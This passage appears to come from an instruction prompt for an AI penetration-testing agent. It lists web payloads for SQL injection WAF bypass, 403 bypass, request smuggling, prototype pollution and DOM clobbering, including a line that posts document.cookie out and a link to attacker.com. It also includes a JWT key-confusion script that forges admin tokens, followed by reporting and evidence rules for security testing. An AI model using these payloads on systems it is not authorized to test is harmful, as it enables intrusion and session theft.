    session2 = login_and_get_cookie()
    # Both should be independently valid (normal) but security check:
    # Does logging out session1 invalidate session2? (It shouldn't, but depends on app)
```

---

## Phase 7: Deepening Techniques (apply where the surface warrants)

### Pass 2: Advanced Bypass Techniques

For every finding or hint from Pass 1 — apply these techniques:

**WAF Bypass Techniques:**
```python
waf_bypass_techniques = {
    "sql_injection": [
        # URL encoding
        "' OR '1'%3D'1'--",
        "%27 OR %271%27%3D%271",
        # Double encoding
        "%2527 OR %25271%2527%253D%25271",
        # Unicode normalization
        "\u0027 OR \u00271\u0027=\u00271",
        # Comment injection
        "' /*!OR*/ '1'='1'--",
        "' /**/OR/**/ '1'='1'--",
        # Case variation
        "' oR '1'='1'--",
        # Null bytes
        "'%00 OR '1'='1'--",
        # Scientific notation (numeric bypass)
        "1e0 UNION SELECT 1,2,3--",
    ],
    "path_traversal_403_bypass": [
        # For endpoints returning 403
        "/api/admin/../admin/users",
        "/api/admin%2Fusers",
        "/api/admin%252Fusers",
        "/api/./admin/./users",
        "/api/admin/users/",   # trailing slash
        "/api/ADMIN/users",    # case variation
    ],
    "header_injection_403_bypass": [
        ("X-Original-URL", "/admin/users"),
        ("X-Rewrite-URL", "/admin/users"),
        ("X-Forwarded-Prefix", "/admin"),
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Real-IP", "127.0.0.1"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Remote-IP", "127.0.0.1"),
        ("X-Client-IP", "127.0.0.1"),
        ("True-Client-IP", "127.0.0.1"),
    ],
    "http_method_bypass": [
        "X-HTTP-Method-Override: DELETE",
        "X-Method-Override: DELETE",
        "_method=DELETE",
        "X-HTTP-Method: DELETE",
    ]
}
```

### Pass 3: Expert-Level Techniques

**HTTP Request Smuggling:**
```python
# CL.TE smuggling
smuggling_payload_cl_te = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Length: 13\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "SMUGGLED"
)

# TE.CL smuggling  
smuggling_payload_te_cl = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5e\r\n"
    "POST /admin HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)
```

**Prototype Pollution:**
```python
pp_payloads = [
    {"__proto__": {"admin": True, "isAdmin": True}},
    {"__proto__": {"role": "admin", "privilege": 9}},
    {"constructor": {"prototype": {"admin": True}}},
    {"__proto__": {"debug": True, "bypass_auth": True}},
]

# URL-based prototype pollution
pp_url_payloads = [
    "?__proto__[admin]=true&__proto__[isAdmin]=true",
    "?constructor[prototype][admin]=true",
    "?__proto__.admin=true",
]
```

**JWT Key Confusion:**
```python
import subprocess, json, requests

def attempt_jwt_key_confusion(token, jwks_url):
    """
    RS256 to HS256 confusion:
    If we can get the public key and use it as HMAC secret → forge any token
    """
    # Step 1: Get the public key from JWKS
    jwks = requests.get(jwks_url).json()
    public_key = jwks["keys"][0]  # Extract first key
    
    # Step 2: Use jwt_tool for key confusion
    result = subprocess.run([
        "python3", "/home/pentester/tools/jwt_tool/jwt_tool.py",
        token, "-X", "k", "-pk", "/tmp/target_public.pem"
    ], capture_output=True, text=True)
    
    forged_token = result.stdout.strip()
    print(f"Forged token: {forged_token}")
    
    # Step 3: Test forged token for privileged access
    resp = requests.get("https://target.com/api/admin",
        headers={"Authorization": f"Bearer {forged_token}"})
    
    if resp.status_code == 200:
        print("✅ JWT KEY CONFUSION CONFIRMED: Admin access via forged token!")
        print(f"Admin response: {resp.text[:500]}")
        return True, forged_token, resp.text
    
    return False, None, None
```

**DOM Clobbering:**
```html
<!-- If HTML injection is available, try to overwrite DOM globals -->
<!-- Overwrite 'config' global variable -->
<a id=config href=//attacker.com>
<a id=config name=bypass href=javascript:alert(1)>

<!-- Overwrite document.getElementById behavior -->
<form id=getElementById>
<input id=getElementById name=value>

<!-- Clobber defaultView -->
<iframe name=defaultView srcdoc="<script>parent.postMessage(document.cookie,'*')</script>">
```

### Pass 4: Final Validation Sweep — 100% Checklist Audit

```bash
#!/bin/bash
# Read /workspace/endpoint_checklist.md and audit coverage

total=$(grep -c "^\[ \]" /workspace/endpoint_checklist.md)
tested=$(grep -c "^\[x\]\|tested\|confirmed-vuln\|skipped" /workspace/endpoint_checklist.md)
pending=$(grep -c "pending\|in-progress" /workspace/endpoint_checklist.md)

echo "Total endpoints: $total"
echo "Tested: $tested"
echo "Pending/In-progress: $pending"
echo "Coverage: $((tested * 100 / total))%"

if [ $pending -gt 0 ]; then
    echo "SCAN CANNOT COMPLETE — $pending endpoints still uncovered:"
    grep "pending\|in-progress" /workspace/endpoint_checklist.md
fi
```

For Pass 4, EVERY agent MUST:
1. Re-run the exact exploit for every confirmed finding to verify reproducibility
2. Verify every report has complete raw HTTP request AND response
3. Verify every report has all 11 mandatory sections
4. Verify every finding has 2+ independent confirmation signals documented
5. Produce coverage percentage — must be 100% before calling agent_finish

---

## Mandatory Real Impact Gate — Applied BEFORE Every Report

Using the think tool, answer ALL of these before ANY vulnerability is reported:

```
THINK TOOL OUTPUT REQUIRED:

Finding: [precise technical description]

Signal 1: [first independent confirmation — exact quote from evidence]
Signal 2: [second independent, different confirmation — exact quote]

Q1 — Real business impact?
  ANSWER: An attacker can [SPECIFIC ACTION] which results in [SPECIFIC CONSEQUENCE] affecting [SPECIFIC USERS/DATA]

Q2 — Specific data/action compromised?
  ANSWER: [exact data type or exact unauthorized action — not vague]

Q3 — Who is affected and at what scale?
  ANSWER: [specific user population + can it be automated?]

Q4 — Exploitable externally?
  ANSWER: [yes/no + conditions if any]

Q5 — Two independent signals confirmed?
  ANSWER: YES — Signal 1: [describe] AND Signal 2: [describe]

Alternative explanations ruled out:
  - Caching? [tested with Cache-Control: no-cache — result: ...]
  - Encoding? [checked HTML entities — result: ...]
  - Design intent? [checked API docs — result: ...]
  - Server load? [tested 5 times, averaged — result: ...]
  
Raw HTTP captured? YES — request saved to [path], response saved to [path]
UI steps documented? YES — [N] steps documented
Severity justification: [evidence-based, not intuitive]

DECISION: [REPORT AS [SEVERITY] / DOWNGRADE TO INFO / DISCARD — reason]
```

---

## Mandatory Evidence Package — Format for Every Report

Every vulnerability report via create_vulnerability_report MUST include in technical_analysis:

```
CONFIRMED VULNERABILITY EVIDENCE PACKAGE
=========================================

VULNERABILITY TYPE: [type]
ENDPOINT: [full URL]
METHOD: [HTTP method]
PARAMETER: [exact vulnerable parameter]

CONFIRMATION SIGNAL 1:
  [describe first signal — exact data or exact result]

CONFIRMATION SIGNAL 2:
  [describe second signal — must be independent of signal 1]

COMPLETE RAW HTTP REQUEST:
--------------------------
[METHOD] [PATH] HTTP/1.1
Host: [target]
Authorization: [token]
Cookie: [session]
Content-Type: [type]
[all other headers]
Content-Length: [n]

[complete request body — mark vulnerable part with ← VULNERABLE PARAMETER]

COMPLETE RAW HTTP RESPONSE:
----------------------------
HTTP/1.1 [status] [text]
Content-Type: [type]
[all response headers]

[complete response body — mark proof with ← PROOF OF EXPLOITATION]

BROWSER EXECUTION PROOF (XSS only):
-------------------------------------
[screenshot filename or OAST callback log]

CROSS-SESSION PROOF (IDOR only):
---------------------------------
User A response to same endpoint: [User A data]
User B response to User A endpoint: [User A data appearing in User B's response]
```

---

## Deep Mode Completion Gate

FORBIDDEN to call agent_finish unless ALL are true:
```
[ ] The attack surface has been mapped and exhausted (no new surface/findings emerging)
[ ] /workspace/endpoint_checklist.md = 100% coverage
[ ] Every confirmed finding: 2+ confirmation signals
[ ] Every report: complete raw HTTP request
[ ] Every report: complete raw HTTP response  
[ ] Every report: all 11 mandatory sections
[ ] No DNS-only SSRF reported as Critical/High
[ ] No missing headers reported as Critical/High
[ ] No CORS findings on public/unauthenticated endpoints
[ ] No XSS reported without browser execution confirmation
[ ] No IDOR reported without actual private data extraction
[ ] Executive summary compiled
```

---

## Deep Mode Mindset

You are conducting the most thorough security assessment this target will ever receive.

When automated tools find nothing: manual testing has just begun.
When one technique fails: you have fifty more.
When a finding seems real but you cannot prove it yet: you investigate until you can.
When you think you have covered everything: there is one more pass to do.

Every endpoint will be tested. Every parameter will be probed. Every finding will be proven with real exploitation. Every report will contain complete raw HTTP evidence. This is what it means to operate in Deep Mode.
